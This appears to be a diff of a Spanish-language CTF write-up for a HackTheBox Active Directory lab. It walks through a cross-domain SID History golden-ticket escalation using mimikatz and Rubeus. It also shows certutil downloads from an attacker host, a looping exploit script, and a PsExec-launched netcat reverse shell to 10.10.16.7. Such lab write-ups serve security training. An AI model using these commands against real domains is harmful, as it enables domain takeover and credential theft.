@@ -2024,21 +2024,21 @@ Info: Establishing connection to remote endpoint
 
 ### Parent Domain Compromise and SID History Injection Attack
 
+En este ataque, nuestro objetivo es escalar privilegios desde el dominio **CORP.GHOST.HTB** hasta el dominio **GHOST.HTB**, el cual es considerado el dominio padre en la infraestructura de confianza. Para lograrlo, aprovechamos la relación de confianza entre ambos dominios y empleamos el ataque de **SID History Injection**. Este ataque nos permite generar un **Golden Ticket** que incluye privilegios de un grupo de alto nivel en el dominio padre, como **Enterprise Admins**, lo que nos otorga permisos elevados en **GHOST.HTB**, incluso si inicialmente solo tenemos acceso a **CORP.GHOST.HTB**.
 
+A lo largo de esta escalada, veremos cómo extraemos el **Domain SID** de ambos dominios, generamos el Golden Ticket y finalmente solicitamos un Ticket de Servicio (TGS) para obtener acceso a los recursos del dominio padre. Al final de este proceso, podremos actuar como administradores en **GHOST.HTB**, obteniendo acceso completo a los sistemas y datos que forman parte de ese dominio.
+
+Desde `BloodHound`, verificamos que el dominio `CORP.GHOST.HTB` y `GHOST.HTB` tienen relación de confianza bidireccional.
 
 <figure><img src="../../.gitbook/assets/imagen (333).png" alt=""><figcaption></figcaption></figure>
 
-
-
 <figure><img src="../../.gitbook/assets/imagen (332).png" alt=""><figcaption></figcaption></figure>
-
-
 
 <figure><img src="../../.gitbook/assets/imagen (334).png" alt=""><figcaption></figcaption></figure>
 
+Ejecutamos el siguiente comando para extraer la información de confianza entre dominios, obteniendo el **Domain SID** de `CORP.GHOST.HTB`:
 
-
-```
+```powershell
 C:\ProgramData>mk.exe "lsadump::trust /patch" exit
 mk.exe "lsadump::trust /patch" exit
 
@@ -2083,13 +2083,17 @@ mimikatz(commandline) # exit
 Bye!
 ```
 
-
+Reviaremos desde `BloodHound` cual es el `SID` del grupo `ENTERPRISE ADMINS` del dominio `GHOST.HTB`.
 
 <figure><img src="../../.gitbook/assets/imagen (326).png" alt=""><figcaption></figcaption></figure>
 
+Usamos el hash NTLM del usuario **`krbtgt`** de `CORP.GHOST.HTB` para generar un **TGT** que incluya el **Enterprise Admins** de **GHOST.HTB** en su SID History. Esto nos permitirá operar con privilegios elevados en el dominio padre.
 
+* **/rc4:** Hash NTLM del usuario **krbtgt** de **CORP.GHOST.HTB**
+* **/sid:** SID del dominio **CORP.GHOST.HTB**
+* **Extra SID:** Añadimos el SID del grupo **Enterprise Admins** de **GHOST.HTB**, lo que nos otorga privilegios elevados en el dominio padre
 
-```
+```powershell
 C:\ProgramData>mk.exe "kerberos::golden /user:Administrator /domain:corp.ghost.htb /rc4:6d6f0fb56ad234f6b85ae8be3ae6e2a3 /sid:S-1-5-21-2034262909-2733679486-179904498 S-1-5-21-4084500788-938703357-3654145966-519 /target:ghost.htb /service:krbtgt /ticket:administrator.kirbi" exit
 mk.exe "kerberos::golden /user:Administrator /domain:corp.ghost.htb /rc4:6d6f0fb56ad234f6b85ae8be3ae6e2a3 /sid:S-1-5-21-2034262909-2733679486-179904498 S-1-5-21-4084500788-938703357-3654145966-519 /target:ghost.htb /service:krbtgt /ticket:administrator.kirbi" exit
 
@@ -2122,21 +2126,21 @@ Final Ticket Saved to file !
 
 mimikatz(commandline) # exit
 Bye!
-
 ```
 
+El siguiente paso será disponer del binario de `Rubeus.exe` y compartirlo a través de un servidor web.
 
-
-```
+```bash
 ❯ ls -l Rubeus.exe
 .rw-r--r-- kali kali 436 KB Fri Feb  7 23:35:07 2025  Rubeus.exe
+
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
+Desde el equipo de `PRIMARY` nos descargaremos el binario indicado.
 
-
-```
+```powershell
 PS C:\ProgramData> certutil.exe -f -urlcache -split http://10.10.16.7/Rubeus.exe Rubeus.exe
 certutil.exe -f -urlcache -split http://10.10.16.7/Rubeus.exe Rubeus.exe
 ****  Online  ****
@@ -2145,7 +2149,10 @@ certutil.exe -f -urlcache -split http://10.10.16.7/Rubeus.exe Rubeus.exe
 CertUtil: -URLCache command completed successfully.
 ```
 
+Usamos **Rubeus** para solicitar un **TGS** con el ticket generado, permitiéndonos autenticarnos en el DC01 de **GHOST.HTB**:
 
+* **/ticket:** Especificamos el ticket **administrator.kirbi** generado anteriormente
+* **/ptt:** Inyectamos el ticket en la sesión actual
 
 ```powershell
 C:\ProgramData>Rubeus.exe asktgs /dc:dc01.ghost.htb /service:cifs/dc01.ghost.htb /ticket:administrator.kirbi /nowrap /ptt
@@ -2183,9 +2190,7 @@ Rubeus.exe asktgs /dc:dc01.ghost.htb /service:cifs/dc01.ghost.htb /ticket:admini
   Base64(key)              :  XCjT3dS64Tp/ztbYK79hmlp/BfVoW2Ed2YwmokOSMWI=
 ```
 
-
-
-
+Comprobamos que el ticket se haya inyectado correctamente en la sesión.
 
 ```powershell
 PS C:\ProgramData> klist
@@ -2207,7 +2212,7 @@ Cached Tickets: (1)
 	Kdc Called: 
 ```
 
-
+Tratamos de verificar el acceso a los recursos compartidos del `DC01.GHOST.HTB` pero se nos muestra mensaje de acceso denegado. Esto debido, que este proceso debe ser más rápido.
 
 ```powershell
 PS C:\ProgramData> dir \\dc01.ghost.htb\c$
@@ -2229,7 +2234,7 @@ At line:1 char:1
  
 ```
 
-
+Por lo tanto, creamos el siguiente script `PS1` para realizar los pasos anteriores en bucle hasta conseguir el acceso correspondiente.
 
 ```powershell
 # Definir las rutas de los ejecutables de Mimikatz y Rubeus
@@ -2281,30 +2286,7 @@ while ($true) {
 }
 ```
 
-
-
-```powershell
-❯ ls -l exploit.ps1
-.rw-rw-r-- kali kali 1.8 KB Sat Feb  8 03:30:24 2025  exploit.ps1
-
-❯ python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-```
-
-
-
-
-
-```powershell
-PS C:\ProgramData> certutil.exe -f -urlcache -split http://10.10.16.7/exploit.ps1 exploit.ps1
-certutil.exe -f -urlcache -split http://10.10.16.7/exploit.ps1 exploit.ps1
-****  Online  ****
-  0000  ...
-  0759
-CertUtil: -URLCache command completed successfully.
-```
-
-
+Ejecutaremos el script de PowerShell y verificaremos que finalmente ganamos acceso a los recursos compartidos del DC.
 
 ```powershell
 PS C:\ProgramData> .\exploit.ps1
@@ -2324,11 +2306,22 @@ d-r---          2/4/2024   1:48 PM                Users
 d-----         7/10/2024   3:08 AM                Windows   
 ```
 
+Teniendo acceso a los recursos del Domain Controller, podemos visualziar directamente la flag de **root.txt**.
 
+```powershell
+PS C:\ProgramData> cat \\DC01.ghost.htb\C$\Users\Administrator\Desktop\root.txt
+cat \\DC01.ghost.htb\C$\Users\Administrator\Desktop\root.txt
+9aa9bfa25***********************
+```
+
+### Shell as Ghost Administrator
+
+Pero lo que nos interesa realmente, es convertirnos en el usuario `Administrator` en el DC. Por lo tanto, lo que realizaremos es compartir el binario de `nc.exe` desde `PRIMARY` hasta el `DC01`. Verificaremos que se ha copiado el binario correctamente.
 
 ```powershell
 PS C:\ProgramData> copy nc.exe \\dc01.ghost.htb\c$\ProgramData
 copy nc.exe \\dc01.ghost.htb\c$\windows\ProgramData
+
 PS C:\ProgramData> dir \\DC01.ghost.htb\C$\ProgramData
 dir \\DC01.ghost.htb\C$\ProgramData
 
@@ -2351,19 +2344,9 @@ d-----         1/30/2024   9:21 AM                VMware
 -a----          2/7/2025   6:51 PM          28160 nc.exe    
 ```
 
+Dado que ahora tenemos una sesión con TGS válido como Administrador del dominio GHOST.HTB para acceder al servicio CIFS, podemos ejecutar PsExec para ejecutar comandos en sistemas remotos.
 
-
-```powershell
-PS C:\ProgramData> cat \\DC01.ghost.htb\C$\Users\Administrator\Desktop\root.txt
-cat \\DC01.ghost.htb\C$\Users\Administrator\Desktop\root.txt
-9aa9bfa25***********************
-```
-
-
-
-### Shell as Ghost Administrator
-
-
+Compartiremos el binario de `PsExec64.exe` a través de un servidor web.
 
 ```bash
 ❯ ls -l PsExec64.exe
@@ -2373,7 +2356,7 @@ cat \\DC01.ghost.htb\C$\Users\Administrator\Desktop\root.txt
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Descargaremos el binario correspondiente en el equipo de `PRIMARY`.
 
 ```powershell
 PS C:\ProgramData> certutil.exe -f -urlcache -split http://10.10.16.7/PsExec64.exe PsExec64.exe
@@ -2384,16 +2367,16 @@ certutil.exe -f -urlcache -split http://10.10.16.7/PsExec64.exe PsExec64.exe
 CertUtil: -URLCache command completed successfully.
 ```
 
-
+Desde una terminal nueva, nos pondremos en escucha para recibir la shell.
 
 ```bash
 ❯ rlwrap -cAr nc -nlvp 4444
 listening on [any] 4444...
 ```
 
+A través del siguiente comando, ejecutaremos en el `DC01` el `nc.exe` que hemos copiado para otorngarnos una Reverse Shell hacia nuestro equipo.
 
-
-```
+```powershell
 PS C:\ProgramData> .\PsExec64.exe -acepteula \\DC01.ghost.htb cmd.exe /c "C:\ProgramData\nc.exe -e powershell 10.10.16.7 4444"
 .\PsExec64.exe -acepteula \\DC01.ghost.htb cmd.exe /c "C:\ProgramData\nc.exe -e powershell 10.10.16.7 4444"
 
@@ -2404,9 +2387,7 @@ Sysinternals - www.sysinternals.com
 Starting cmd.exe on DC01.ghost.htb...1.ghost.htb...
 ```
 
-
-
-
+Verificamos que ganamos acceso al `DC01.GHOST.HTB` con el usuario `Administrator` y podemos visualizar correctamente la flag de **root.txt.**
 
 ```bash
 ❯ rlwrap -cAr nc -nlvp 4444
